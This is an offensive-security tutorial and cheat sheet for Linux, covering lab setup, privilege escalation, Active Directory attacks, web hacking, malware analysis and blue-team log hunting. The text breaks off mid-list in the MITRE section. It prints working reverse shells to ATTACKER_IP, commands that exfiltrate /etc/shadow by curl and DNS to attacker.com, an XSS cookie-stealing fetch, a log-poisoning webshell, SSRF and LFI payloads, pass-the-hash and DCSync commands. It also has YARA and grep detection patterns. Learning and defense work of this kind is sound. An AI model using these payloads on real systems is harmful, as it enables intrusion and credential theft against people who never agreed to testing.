# 💀 LINUX: THE OPERATOR'S MASTER RESOURCE 💀
## "Owning the Machine: From Zero to Root — Every Perspective"

> *Red Team breaks it. Blue Team hunts it. Malware Analyst dissects it. Bug Bounty Hunter reports it. All four live on Linux.*

---

## 📑 TABLE OF CONTENTS

- [PHASE 0 — Machine Setup (VirtualBox + Kali)](#phase-0)
- [PHASE 1 — Core Linux Mastery](#phase-1)
- [PHASE 2 — Networking & Traffic Analysis](#phase-2)
- [PHASE 3 — Privilege Escalation & Post-Exploitation](#phase-3)
- [PHASE 4 — Active Directory & Enterprise Attacks](#phase-4)
- [PHASE 5 — Web Application Hacking (Bug Bounty)](#phase-5)
- [PHASE 6 — Malware Analysis & Reverse Engineering](#phase-6)
- [PHASE 7 — Blue Team, SOC & Threat Hunting](#phase-7)
- [PHASE 8 — Persistence, Stealth & OPSEC](#phase-8)
- [PHASE 9 — Infrastructure & Lab Scaling](#phase-9)
- [APPENDIX — Master Cheat Sheet](#appendix)

---

<a name="phase-0"></a>
## 🖥️ PHASE 0: MACHINE SETUP — VirtualBox + Kali Linux
*Your lab is your foundation. A misconfigured lab wastes hours. Do this once, do it right.*

### 0.1 VirtualBox Configuration (Your Hardware: i5 11th Gen / 8GB RAM / 512GB SSD)

**Recommended VM Specs:**
| Setting | Value | Why |
|:---|:---|:---|
| RAM | 3 GB (3072 MB) | Safe ceiling — leaves 5GB for host |
| CPU Cores | 2 | Don't go above 50% of physical cores |
| Storage | 80 GB VDI (Dynamic) | Dynamic means it grows only as used |
| Display VRAM | 128 MB | Needed for any GUI work |
| Acceleration | VT-x/AMD-V + Nested Paging | Critical for performance |
| USB Controller | USB 3.0 | Required for modern devices |

**Network Adapters (Both must be enabled):**

| Adapter | Mode | Purpose |
|:---|:---|:---|
| Adapter 1 | NAT | Internet access (apt updates, downloads) |
| Adapter 2 | Host-Only (vboxnet0) | Direct host↔VM comms, isolated lab traffic |

> ⚠️ Never use **Bridged** mode unless intentionally attacking your local network in a lab. Bridged puts your VM directly on your physical LAN.

**Creating the Host-Only Network:**
```
VirtualBox → File → Host Network Manager → Create
IP: 192.168.56.1 (default), DHCP enabled
```

### 0.2 Installing Kali — Post-Install Checklist

```bash
# Step 1: Full system update (always first)
sudo apt update && sudo apt full-upgrade -y

# Step 2: Install VirtualBox Guest Additions (critical for shared clipboard, screen resize)
sudo apt install -y virtualbox-guest-x11
sudo reboot

# Step 3: Install core missing tools
sudo apt install -y git curl wget net-tools nmap gobuster \
  python3-pip python3-venv tmux vim neovim htop tree \
  seclists wordlists

# Step 4: Install common pentest extras
sudo apt install -y gobuster feroxbuster dirsearch \
  ffuf sqlmap hydra john hashcat crackmapexec \
  impacket-scripts evil-winrm bloodhound neo4j

# Step 5: Rockyou wordlist (unzip if not already)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 0.3 Snapshot Strategy (Critical for Lab Safety)

Take snapshots at every major milestone — they are your save states.

```
Snapshot 0: "Fresh Install + Updated"        ← baseline, never delete
Snapshot 1: "Tools Installed"
Snapshot 2: "Pre-Lab: [Lab Name]"            ← before touching any target
```

To create via CLI:
```bash
# From host terminal (not inside VM)
VBoxManage snapshot "Kali" take "Tools Installed" --description "Post apt install"
```

### 0.4 Terminal Environment Hardening

```bash
# Install Zsh + Oh My Zsh
sudo apt install zsh -y
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# Install Powerlevel10k theme
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git \
  ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
# Set ZSH_THEME="powerlevel10k/powerlevel10k" in ~/.zshrc

# Install useful plugins
git clone https://github.com/zsh-users/zsh-autosuggestions \
  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git \
  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
# Add to plugins=() in ~/.zshrc: git zsh-autosuggestions zsh-syntax-highlighting
```

**Essential `.zshrc` aliases:**
```bash
# Navigation
alias ll='ls -la --color=auto'
alias ..='cd ..'
alias ...='cd ../..'

# Pentest shortcuts
alias update='sudo apt update && sudo apt full-upgrade -y'
alias myip='curl -s https://ipinfo.io/ip'
alias localip='ip a | grep "inet " | awk "{print \$2}"'
alias listen='ss -tunlp'

# Python
alias py='python3'
alias venv='python3 -m venv venv && source venv/bin/activate'

# Nmap shortcuts
alias nmap-quick='nmap -sV -sC -T4'
alias nmap-full='nmap -sV -sC -p- -T4 --open'
alias nmap-udp='sudo nmap -sU -T4 --top-ports 100'
```

### 0.5 Tmux Configuration

Tmux keeps your sessions alive even when your terminal crashes or connection drops. For a VirtualBox session, this matters during long scans.

```bash
# Create ~/.tmux.conf
cat > ~/.tmux.conf << 'EOF'
# Change prefix from Ctrl+B to Ctrl+A (easier to reach)
unbind C-b
set-option -g prefix C-a
bind-key C-a send-prefix

# Split panes with | and -
bind | split-window -h
bind - split-window -v

# Mouse support
set -g mouse on

# Increase scroll history
set -g history-limit 50000

# Status bar
set -g status-style bg=black,fg=green
set -g status-left "[#S] "
set -g status-right "%H:%M %d-%b-%y"
EOF

# Core tmux commands
# New session:       tmux new -s mysession
# Detach:            Ctrl+A, D
# Reattach:          tmux attach -t mysession
# New window:        Ctrl+A, C
# Switch window:     Ctrl+A, N / P
# Split horizontal:  Ctrl+A, |
# Split vertical:    Ctrl+A, -
```

### 0.6 SSH Setup (Key-Based Auth)

```bash
# Generate ED25519 key (stronger than RSA-2048)
ssh-keygen -t ed25519 -C "kali-lab" -f ~/.ssh/id_ed25519

# Copy to a target (when practicing pivoting between VMs)
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.56.x

# Disable password auth in /etc/ssh/sshd_config
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo systemctl restart ssh
```

### 0.7 Multi-VM Lab Architecture (Recommended)

For full-spectrum practice (Red + Blue + Malware), you'll eventually want multiple VMs. With 8GB RAM, this is tight — use lightweight targets:

```
Host (Windows 11)
  ├── Kali Linux 3GB      — Attacker / SOC Analyst workstation
  ├── Metasploitable2 1GB — Vulnerable Linux target (for practice)
  └── [Flare-VM or REMnux — for malware analysis, swap as needed]
```

> 💡 Run only 2 VMs at once on your machine. Snapshot and swap rather than running all simultaneously.

---

<a name="phase-1"></a>
## 🌑 PHASE 1: CORE LINUX MASTERY
*What every type of hacker must know cold.*

### 1.1 Filesystem Deep Dive

```
/               Root
├── /etc        Config files (passwd, shadow, ssh, hosts, cron)
├── /var/log    Logs (auth.log, syslog, apache2/, nginx/)
├── /tmp        World-writable — classic staging area for payloads
├── /dev        Device files — /dev/null, /dev/tty, /dev/mem
├── /proc       Virtual FS — process info, kernel params
│   ├── /proc/[PID]/cmdline  → what command spawned this process
│   ├── /proc/[PID]/maps     → memory map (useful for RE)
│   └── /proc/net/tcp        → active TCP connections without netstat
├── /sys        Kernel & hardware exposed as files
├── /opt        Third-party software installs
└── /home       User directories — goldmine for credentials
```

**Useful forensic enumeration:**
```bash
# Recently modified files (last 10 mins) — threat hunting
find / -mmin -10 -type f 2>/dev/null

# World-writable directories — privilege escalation targets
find / -type d -perm -0002 2>/dev/null

# SUID binaries — escalation goldmine
find / -perm -4000 -type f 2>/dev/null

# Files owned by root but writable by others
find / -user root -perm -0002 -type f 2>/dev/null

# Hidden files in home directories
find /home -name ".*" -type f 2>/dev/null
```

### 1.2 Text Processing Mastery (grep / awk / sed / cut)

These are the difference between a script kiddie and an operator. Every log analysis, every credential extraction, every automated recon depends on this.

```bash
# grep — pattern search
grep -r "password" /etc/ 2>/dev/null          # recursive search
grep -i "error\|fail" /var/log/auth.log        # case-insensitive, OR pattern
grep -v "^#" /etc/ssh/sshd_config             # exclude comment lines
grep -oP '(\d{1,3}\.){3}\d{1,3}' file.txt    # extract IPs with regex

# awk — field-based processing
awk -F: '{print $1,$3}' /etc/passwd           # print username + UID
awk '{print $NF}' file.txt                    # last field of each line
awk '$3 == 0 {print $1}' /etc/passwd          # users with UID 0

# sed — stream editing
sed 's/foo/bar/g' file.txt                    # replace all occurrences
sed -n '10,20p' file.txt                      # print lines 10-20
sed -i '/^#/d' file.txt                       # delete comment lines in-place

# cut — column slicing
cut -d: -f1 /etc/passwd                       # extract usernames
cut -d' ' -f1-4 access.log                   # first 4 fields of log

# Chaining them (Log analysis example)
cat /var/log/auth.log | grep "Failed password" | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -20
# → Top 20 IPs brute-forcing SSH
```

### 1.3 Bash Scripting — Operator Level

```bash
#!/bin/bash
# Port sweep + banner grab for a /24 subnet
# Usage: ./sweep.sh 192.168.56

SUBNET=$1
echo "[*] Sweeping $SUBNET.0/24"

for host in $(seq 1 254); do
    IP="${SUBNET}.${host}"
    if ping -c 1 -W 1 "$IP" &>/dev/null; then
        echo "[+] Host up: $IP"
        # Banner grab on common ports
        for port in 22 80 443 445 3389 8080; do
            result=$(timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && echo "OPEN")
            [ "$result" == "OPEN" ] && echo "    └─ Port $port OPEN"
        done
    fi
done
```

**Error handling & defensive scripting:**
```bash
# Always check return codes
command || { echo "[-] Command failed"; exit 1; }

# Trap for cleanup
trap 'rm -f /tmp/staging_*; echo "Cleaned up"' EXIT

# Validate arguments
[ -z "$1" ] && { echo "Usage: $0 <target>"; exit 1; }
```

---

<a name="phase-2"></a>
## 🌐 PHASE 2: NETWORKING & TRAFFIC ANALYSIS
*The network never lies. Learn to read it.*

### 2.1 Network Enumeration

```bash
# Interface status
ip a                              # modern replacement for ifconfig
ip route show                     # routing table — identify gateway + subnets
arp -a                            # ARP cache — who's on your LAN

# Active connections
ss -tunlp                         # all TCP/UDP, listening + established
ss -antp | grep ESTABLISHED       # only established connections
cat /proc/net/tcp                 # raw kernel TCP table (no tools needed)

# DNS
cat /etc/resolv.conf              # configured DNS servers
nslookup target.com               # basic DNS query
dig target.com ANY                # full DNS record dump
dig @8.8.8.8 target.com MX       # MX record via Google DNS
host -t ns target.com             # name servers

# Routing & pivot recon
traceroute target.com
ip route add 10.10.10.0/24 via 192.168.56.1   # add static route for pivoting
```

### 2.2 Nmap — Comprehensive Reference

```bash
# Discovery (Phase 1 — always start here)
nmap -sn 192.168.56.0/24                     # ping sweep (no port scan)
nmap -sn --send-ip 192.168.56.0/24           # bypass ARP limitation in VMs

# Standard service scan
nmap -sV -sC -T4 -oN scan.txt 192.168.56.x  # -oN saves to file

# Full port scan (all 65535)
nmap -p- -T4 --min-rate 5000 192.168.56.x

# Version + vuln scripts
nmap -sV --script=vuln 192.168.56.x

# OS detection (requires root)
sudo nmap -O 192.168.56.x

# Specific script categories
nmap --script=smb-vuln* 192.168.56.x         # SMB vulnerability check
nmap --script=http-enum 192.168.56.x         # web directory enumeration
nmap --script=ftp-anon 192.168.56.x          # check FTP anonymous login

# UDP (slow but important — SNMP, DNS, TFTP live here)
sudo nmap -sU --top-ports 100 192.168.56.x

# Output formats
# -oN normal  -oX XML  -oG grep-friendly  -oA all three at once
nmap -sV -sC -oA full_scan 192.168.56.x
```

### 2.3 Wireshark / tcpdump — Packet Analysis

**tcpdump (CLI — remote capture, scripting)**
```bash
# Capture all traffic on interface
sudo tcpdump -i eth0 -w capture.pcap

# Filter by host
sudo tcpdump -i eth0 host 192.168.56.10

# Filter by port
sudo tcpdump -i eth0 port 80 or port 443

# Capture HTTP POST requests (look for credentials)
sudo tcpdump -i eth0 -A port 80 | grep -iE "pass|login|user|auth"

# Read pcap
tcpdump -r capture.pcap -n | head -50
```

**Wireshark display filters:**
```
http.request.method == "POST"          → HTTP POST requests
http contains "password"               → credential hunting
tcp.flags.syn == 1 && tcp.flags.ack == 0   → SYN scan detection
icmp                                   → ping traffic
dns                                    → all DNS queries
ip.addr == 192.168.56.10              → filter by host
tcp.port == 4444                       → Meterpreter default port
frame contains "NTLMSSP"              → NTLM authentication (lateral movement)
```

**Blue Team filter — detecting common attacks:**
```
# Port scan detection
tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.window_size <= 1024

# ARP spoofing detection (same IP, different MAC)
arp.duplicate-address-detected

# DNS exfiltration (unusually long DNS queries)
dns.qry.name.len > 50
```

### 2.4 Netcat — The Operator's Swiss Army Knife

```bash
# Listen for incoming connection
nc -lvnp 4444

# Connect to listener
nc 192.168.56.x 4444

# File transfer
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc 192.168.56.x 4444 < file_to_send

# Port scan (no nmap? no problem)
nc -zv 192.168.56.x 1-1024 2>&1 | grep "open"

# Simple HTTP request
echo -e "GET / HTTP/1.0\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Bind shell (victim opens port, attacker connects)
# On victim:  nc -lvnp 4444 -e /bin/bash
# On attacker: nc 192.168.56.x 4444

# Reverse shell (victim connects back — bypasses firewall)
# On attacker: nc -lvnp 4444
# On victim:   bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

<a name="phase-3"></a>
## 🔴 PHASE 3: PRIVILEGE ESCALATION & POST-EXPLOITATION
*(Red Team Perspective)*

### 3.1 Privilege Escalation — Methodology

Always enumerate before exploiting. Manual first, automated second.

**Manual Enumeration Checklist:**
```bash
# --- Identity & Context ---
id                                    # current user + groups
whoami && hostname
sudo -l                               # what can I run as root?
cat /etc/sudoers 2>/dev/null

# --- SUID/SGID Binaries ---
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
# Cross-reference findings with https://gtfobins.github.io

# --- Cron Jobs ---
crontab -l                            # current user's crons
cat /etc/crontab                      # system-wide crons
ls -la /etc/cron.* /var/spool/cron/

# --- Writable Files Owned by Root ---
find / -user root -writable -type f 2>/dev/null | grep -v proc

# --- PATH Hijacking ---
echo $PATH
# If /tmp or . is in PATH before /usr/bin, you can hijack commands

# --- Capabilities ---
getcap -r / 2>/dev/null               # binaries with elevated capabilities
# e.g., python3 with cap_setuid can get root

# --- Services & Processes Running as Root ---
ps aux | grep root
cat /etc/systemd/system/*.service 2>/dev/null

# --- NFS Misconfig ---
cat /etc/exports                      # no_root_squash = escalation vector

# --- Kernel Version ---
uname -a                              # search exploit-db for kernel exploits
```

**GTFOBins Quick Examples:**
```bash
# vim with sudo → shell escape
sudo vim -c ':!/bin/bash'

# find with sudo → command execution
sudo find . -exec /bin/bash \; -quit

# python with SUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# awk with sudo
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 3.2 Automated Enumeration Tools

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# pspy — monitor processes without root (catches cron jobs)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64 && ./pspy64
```

### 3.3 Post-Exploitation — After Getting Root

```bash
# Credential harvesting
cat /etc/shadow                       # password hashes → crack offline
cat /home/*/.bash_history             # command history often has passwords
grep -r "password\|passwd\|secret\|api_key" /home/ /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
find / -name "id_rsa" 2>/dev/null    # SSH private keys

# Lateral movement prep
cat /etc/hosts                        # internal hostnames
arp -a                                # neighboring hosts
ss -tunlp                             # services to pivot through
cat /root/.ssh/authorized_keys        # who can access root via SSH?

# Persistence (covered in depth in Phase 8)
# Data exfil via DNS (stealthy)
cat /etc/shadow | xxd | while read line; do nslookup "${line}.attacker.com" > /dev/null; done
```

### 3.4 Living Off the Land (LOLBins) — OPSEC-Safe Execution

LOLBins are legitimate system binaries abused for malicious purposes. They evade AV/EDR because they're signed system tools.

```bash
# Data exfiltration with curl (pre-installed everywhere)
curl -X POST https://attacker.com/collect -d @/etc/shadow

# Download without wget or curl
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker.com/shell.sh', '/tmp/s.sh')"

# Encode/decode to bypass AV signatures
base64 /bin/bash | curl -X POST https://attacker.com/ -d @-

# Compile C payload in-memory
echo '#include<stdio.h>\nint main(){setuid(0);system("/bin/bash");}' | \
  tee /tmp/x.c && gcc /tmp/x.c -o /tmp/x && /tmp/x

# Python reverse shell (often available even when nc isn't)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

---

<a name="phase-4"></a>
## 🏢 PHASE 4: ACTIVE DIRECTORY & ENTERPRISE ATTACKS
*(Red Team — most corporate environments run Windows AD)*

### 4.1 AD Concepts Every Operator Must Know

```
Domain Controller (DC)     → Central auth server (Kerberos + LDAP)
Kerberos                   → Auth protocol: TGT → TGS → Service
NTLM                       → Legacy auth — hash-based, relay-able
SMB                        → File sharing protocol — attack surface
LDAP                       → Directory queries — enumerate users/groups
WinRM (5985/5986)          → Remote PowerShell — lateral movement
RDP (3389)                 → Remote desktop
```

### 4.2 Enumeration from Linux Against AD

```bash
# SMB enumeration
smbclient -L //DC_IP/ -U ""          # null session share listing
smbmap -H DC_IP                       # share permissions map
crackmapexec smb DC_IP                # quick SMB fingerprint

# LDAP enumeration (no creds needed if misconfigured)
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" | grep sAMAccountName

# Impacket suite (your AD Swiss Army knife)
impacket-GetADUsers -all corp.local/ -dc-ip DC_IP    # list all users
impacket-lookupsid corp.local/user:pass@DC_IP        # enumerate SIDs

# CrackMapExec (CME) — lateral movement and enum
crackmapexec smb 192.168.1.0/24 -u user -p password  # spray subnet
crackmapexec smb DC_IP -u user -p password --shares   # enumerate shares
crackmapexec smb DC_IP -u user -p password --sam      # dump SAM
```

### 4.3 Kerberoasting — Extract Service Hashes Without Admin

```bash
# From Linux (impacket)
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request
# → Dumps TGS tickets (hashes) for service accounts
# → Crack offline with hashcat

# Crack mode 13100 (Kerberos 5 TGS-REP)
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (accounts with "don't require Kerberos pre-auth")
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip DC_IP
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### 4.4 Pass-the-Hash (PtH) — No Password Needed

```bash
# If you have the NTLM hash but not the plaintext password
impacket-psexec -hashes :NTLMHASH corp.local/Administrator@DC_IP

# WMI exec
impacket-wmiexec -hashes :NTLMHASH corp.local/Administrator@DC_IP

# Evil-WinRM with hash
evil-winrm -i DC_IP -u Administrator -H NTLMHASH
```

### 4.5 BloodHound — Attack Path Visualization

```bash
# Collect data (from compromised domain user)
bloodhound-python -d corp.local -u user -p pass -c All -ns DC_IP

# Start BloodHound
sudo neo4j start
bloodhound &
# Import the JSON files, then:
# Pre-built query: "Shortest Path to Domain Admin"
# Look for: DCSync rights, WriteDACL, GenericAll edges
```

### 4.6 DCSync — Dump All Domain Hashes

```bash
# Requires: Domain Admin OR DCSync rights (Replication privileges)
impacket-secretsdump corp.local/Administrator:pass@DC_IP
# → Dumps NTDS.dit — all domain hashes
# → Pass-the-Hash or crack them → total domain compromise
```

---

<a name="phase-5"></a>
## 🕷️ PHASE 5: WEB APPLICATION HACKING (Bug Bounty)
*The most accessible entry point. Every target has a web surface.*

### 5.1 Recon Methodology — The Foundation of Bug Bounty

```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -d target.com >> subs.txt
cat subs.txt | sort -u > subs_unique.txt

# 2. Check which subdomains are alive
cat subs_unique.txt | httpx -silent -status-code -title -o alive.txt

# 3. Technology fingerprinting
whatweb https://target.com                    # identify tech stack
wappalyzer (browser extension)

# 4. Directory/endpoint bruteforce
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# 5. Parameter discovery
arjun -u https://target.com/page             # hidden parameter finder

# 6. JavaScript file analysis (endpoints, API keys, tokens)
gau target.com | grep "\.js$"
cat endpoints.js | grep -E "https?://|/api/|token|secret|key"
```

### 5.2 OWASP Top 10 — Hands-On Attack Techniques

**SQL Injection**
```bash
# Manual test
' OR '1'='1
' OR 1=1--
'; DROP TABLE users;--

# Automated (sqlmap)
sqlmap -u "https://target.com/item?id=1" --dbs                  # enumerate databases
sqlmap -u "https://target.com/item?id=1" -D dbname --tables      # tables in DB
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump  # dump table
sqlmap -u "https://target.com/login" --data="user=admin&pass=x" --forms  # POST
```

**Cross-Site Scripting (XSS)**
```javascript
// Basic test payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(document.cookie)</script>
// Bypass filters
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// Account takeover via XSS (cookie theft)
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Server-Side Request Forgery (SSRF)**
```
# Target cloud metadata endpoints
http://169.254.169.254/latest/meta-data/          # AWS IMDSv1
http://metadata.google.internal/computeMetadata/   # GCP

# Bypass filters
http://127.0.0.1:80
http://0x7f000001                                  # hex-encoded 127.0.0.1
http://[::1]                                       # IPv6 loopback
http://127.1                                       # short form
```

**Insecure Direct Object Reference (IDOR)**
```
# Test by changing IDs in URLs/parameters
GET /api/user/1234/profile  →  try /api/user/1235/profile
GET /download?file=invoice_1234.pdf  →  try file=invoice_1.pdf

# UUIDs — test with wordlist of observed UUIDs
# Check response length — different length = likely IDOR
```

**Local File Inclusion (LFI)**
```bash
# Basic
?page=../../../../etc/passwd
?page=....//....//....//etc/shadow

# PHP wrapper (read PHP source without execution)
?page=php://filter/convert.base64-encode/resource=config.php

# Log poisoning → RCE
# 1. Inject PHP into User-Agent:  <?php system($_GET['cmd']); ?>
# 2. Include the log file:        ?page=../../../../var/log/apache2/access.log&cmd=id
```

### 5.3 Burp Suite — Essential Setup

```
Proxy → Intercept → Configure browser to use 127.0.0.1:8080
Target → Site Map → Right-click → Spider / Active Scan
Intruder → Positions → Sniper (single param) / Cluster Bomb (multi param)
Repeater → Manually replay & modify requests
Decoder → Encode/decode Base64, URL, HTML, Hex
Comparer → Diff two responses

# Essential extensions (BApp Store)
- Active Scan++
- Autorize  (IDOR/broken access control automation)
- Logger++  (advanced request logging)
- JSON Web Tokens (JWT attacks)
- Param Miner (hidden parameter discovery)
```

### 5.4 Bug Bounty Workflow & Reporting

```
1. Scope review         → What's in scope? Subdomains? APIs?
2. Passive recon        → subfinder, amass, Shodan, crt.sh
3. Active recon         → httpx, gobuster, nuclei
4. Vulnerability test   → Manual + Burp + specific tools
5. Exploit + impact     → Demonstrate real-world impact (don't just find, prove)
6. Report writing       → Title, CVSS score, steps to reproduce, POC, remediation

# Report template components
Title: [Type] in [Component] allows [Impact]
Severity: Critical/High/Medium/Low (use CVSS calculator)
Steps to Reproduce: 1. 2. 3.
POC: Screenshot/video + curl command
Impact: What attacker can do (data exfil, account takeover, RCE?)
Remediation: How to fix it
```

---

<a name="phase-6"></a>
## 🔬 PHASE 6: MALWARE ANALYSIS & REVERSE ENGINEERING
*The digital autopsy. Understanding the weapon.*

### 6.1 Lab Setup — Isolated Malware Analysis Environment

> ⚠️ **NEVER analyze malware on your host machine.** Use a dedicated VM with no shared folders and network isolated.

**REMnux (Linux malware analysis distro):**
```bash
# Download REMnux OVA, import in VirtualBox
# Set network adapter to: Internal Network (air-gapped)
# Tools pre-installed: Volatility, YARA, Wireshark, strings, binwalk, oledump, etc.
```

**Safe analysis environment checklist:**
```
✅ VM with snapshots (revert after each sample)
✅ Network: Internal only OR INetSim (simulated internet)
✅ No shared clipboard with host
✅ No shared folders with host
✅ Disable VirtualBox Guest Additions (prevents host escape)
```

**INetSim — simulate network services for dynamic analysis:**
```bash
sudo apt install inetsim
sudo inetsim            # now simulates DNS, HTTP, SMTP, etc.
# Malware trying to call home hits your fake server instead
```

### 6.2 Static Analysis — Examine Without Executing

```bash
# File identification
file malware.exe                      # type, architecture, packed?
xxd malware.exe | head -20            # hex dump — magic bytes
strings malware.exe                   # readable strings
strings -n 8 malware.exe | grep -iE "http|cmd|powershell|registry|socket"

# PE file analysis (Windows executables on Linux)
sudo apt install pev
readpe malware.exe                    # PE headers
pedis malware.exe                     # disassembly
pestr malware.exe                     # strings in PE sections

# Check for packing/obfuscation
exeinfo malware.exe                   # packer detection
peid (Windows, via Wine)

# Hashing for IOC extraction
md5sum malware.exe
sha256sum malware.exe
# → Submit hash to VirusTotal

# YARA rule matching
yara rules.yar malware.exe

# Binwalk — extract embedded files
binwalk -e malware.bin
```

### 6.3 Dynamic Analysis — Controlled Execution

```bash
# strace — syscall tracer
strace ./malware 2>&1 | tee strace.log
strace -e trace=network ./malware     # only network syscalls
strace -e trace=file ./malware        # only file operations

# ltrace — library call tracer
ltrace ./malware 2>&1 | head -50

# auditd — kernel-level monitoring
sudo auditd -f                        # foreground mode
ausearch -f /etc/passwd               # who touched passwd?
ausearch -sc execve                   # all program executions

# Monitor file system changes
inotifywait -m -r /tmp /home         # watch for new files

# Network traffic during execution
sudo tcpdump -i any -w malware_traffic.pcap &
./malware
kill %1
tcpdump -r malware_traffic.pcap      # analyze what it connected to
```

### 6.4 Disassembly & Reverse Engineering

**Ghidra (NSA's free RE tool — runs on Linux)**
```bash
# Install
sudo apt install ghidra
ghidra &

# Workflow:
# New Project → Import malware.exe → Open in CodeBrowser
# Auto-analyze → View Disassembly + Decompiler side by side
# Look for: main(), WinMain(), interesting function names
# Rename functions as you understand them
# Look for: crypto routines, network calls, registry ops, process injection
```

**radare2 (CLI disassembler)**
```bash
r2 malware.exe
[0x004...]> aaa              # analyze all (functions, strings)
[0x004...]> afl              # list all functions
[0x004...]> pdf @main        # disassemble main function
[0x004...]> iz               # list all strings
[0x004...]> /r 0x401000      # find references to address
[0x004...]> VV               # visual call graph
```

### 6.5 Memory Forensics — Volatility 3

```bash
# Acquire memory image (on victim machine)
sudo dd if=/proc/kcore of=/tmp/mem.dump bs=4M

# Volatility 3 analysis
vol -f mem.dump linux.pslist           # running processes
vol -f mem.dump linux.pstree          # process tree (spot injected procs)
vol -f mem.dump linux.netstat         # network connections
vol -f mem.dump linux.bash            # bash command history in memory
vol -f mem.dump linux.malfind         # injected code / memory anomalies
vol -f mem.dump linux.lsof            # open files per process

# Extract a process's memory
vol -f mem.dump linux.memmap --pid 1234 --dump

# Windows memory dump (for Windows samples)
vol -f win.dmp windows.pslist
vol -f win.dmp windows.cmdline        # command line of each process
vol -f win.dmp windows.dlllist --pid 1234   # loaded DLLs
vol -f win.dmp windows.malfind        # injected shellcode
```

### 6.6 YARA Rules — Malware Signatures

```yara
rule Suspicious_Reverse_Shell {
    meta:
        author = "Operator"
        description = "Detects common reverse shell patterns"
    strings:
        $bash_tcp = "/dev/tcp/" ascii
        $python_socket = "socket.connect" ascii
        $nc_exec = "-e /bin/bash" ascii
        $base64_decode = "base64 -d" ascii
    condition:
        any of them
}

rule Packed_PE {
    meta:
        description = "UPX packed PE file"
    strings:
        $upx0 = "UPX0" ascii
        $upx1 = "UPX1" ascii
    condition:
        $upx0 and $upx1
}
```

```bash
# Run YARA
yara -r rules/ /path/to/scan/          # recursive scan
yara -s suspicious.yar malware.bin     # show matching strings
```

---

<a name="phase-7"></a>
## 🔵 PHASE 7: BLUE TEAM, SOC & THREAT HUNTING
*The other side. Detecting what the red team does.*

### 7.1 Critical Log Files Every SOC Analyst Must Know

```bash
# Authentication
/var/log/auth.log              # sudo usage, SSH logins, su attempts (Debian/Ubuntu)
/var/log/secure                # same, on RHEL/CentOS
/var/log/wtmp                  # login records (read with: last)
/var/log/btmp                  # failed logins (read with: lastb)
/var/log/lastlog               # last login per user (read with: lastlog)

# System
/var/log/syslog                # general system events
/var/log/kern.log              # kernel messages
/var/log/dmesg                 # boot + hardware logs

# Application
/var/log/apache2/access.log    # HTTP requests
/var/log/apache2/error.log     # web server errors
/var/log/nginx/access.log      # nginx equivalent
/var/log/mysql/error.log       # DB errors

# Audit (if auditd is running)
/var/log/audit/audit.log       # kernel-level syscall audit trail
```

### 7.2 Log Analysis Patterns — Detecting Real Attacks

```bash
# SSH Brute Force Detection
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10
# → IPs with > 10 failures in auth.log = likely brute force

# Successful login AFTER failures (compromise indicator)
grep "Failed password\|Accepted password" /var/log/auth.log | \
  grep -A1 "Failed" | grep "Accepted"

# Privilege escalation detection
grep "sudo:" /var/log/auth.log | grep -v "session opened\|session closed"

# New user created (persistence)
grep "useradd\|adduser" /var/log/auth.log

# Unusual SUID binary created
ausearch -k suid_files 2>/dev/null   # requires audit rule for this

# Webshell activity (Apache)
grep "cmd=\|exec(\|system(\|passthru(" /var/log/apache2/access.log

# Reverse shell indicators in logs
grep "bash -i\|/dev/tcp\|nc -e\|python.*socket" /var/log/syslog
```

### 7.3 MITRE ATT&CK Framework — Mapping TTPs

```
Tactic              → What the attacker is trying to achieve
Technique           → How they do it
Sub-technique       → Specific variation

Recon         → T1595 (Active Scanning), T1592 (Gather Victim Host Info)
Initial Access → T1190 (Exploit Public-Facing App), T1566 (Phishing)
Execution      → T1059 (Command & Scripting Interpreter — bash, python)
